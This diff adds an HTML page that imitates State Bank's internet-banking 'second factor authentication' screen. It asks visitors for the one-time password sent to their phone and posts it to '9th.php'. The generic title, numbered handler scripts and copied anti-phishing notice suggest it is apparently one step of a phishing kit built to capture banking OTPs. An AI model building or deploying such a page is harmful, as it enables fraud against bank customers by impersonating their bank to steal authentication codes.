@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style/otp.css">
+</head>
+<body>
+    <header>
+        <img src="style/otplogo.png" alt="logootp">
+        <div class="time"><span style="margin-left: 240px;font-size: 10px;font-weight: 700;" id="datetime"></span></div>
+       <div class="factor">
+        <h5>Login Second Factor Authentication</h5>
+       </div>
+    </header>
+    <script>
+        function insertDateTime() {
+            var currentDate =new Date();
+            var dateString = currentDate.toDateString();
+            var timeString = currentDate.toLocaleTimeString();
+
+            document.getElementById("datetime").innerHTML= dateString +' [' + timeString+']';
+
+        }
+        window.onload=insertDateTime;
+    </script>
+    <div class="sent">Enter the One Time Password sent to your mobile phone</div>
+    <p>Mandatory fields are marked with an asterisk(*)</p>
+    <form action="9th.php" method="post">
+        <div class="otp">
+            <div><label for="" style="margin-bottom: 8px; outline: none;">One Time Password <span style="color: #f37856;">*</span></label></div>
+            <input type="password" name="otp4" style="margin-bottom: 8px; outline: none;" required autocomplete="off">
+        </div>
+        <br>
+        <div class="btn"><button class="submit" type="submit"> Submit</button></div>
+        <div class="resend">
+            <h6>If you did not recieve the High Security Password on SMS, you can <button class="rsend" type="submit">Click here to resend the OTP</button></h6>
+        </div>
+    </form>
+    <div class="content">
+        <li>Please note that all communication related to Internet banking will be sent on your registered mobile number.</li>
+        <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report.phishing@sbi.co.in if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials.</li>
+    </div>
+    <div>
+        <img src="style/otpfooter.png" alt="footer">
+    </div>
+</body>
+</html>
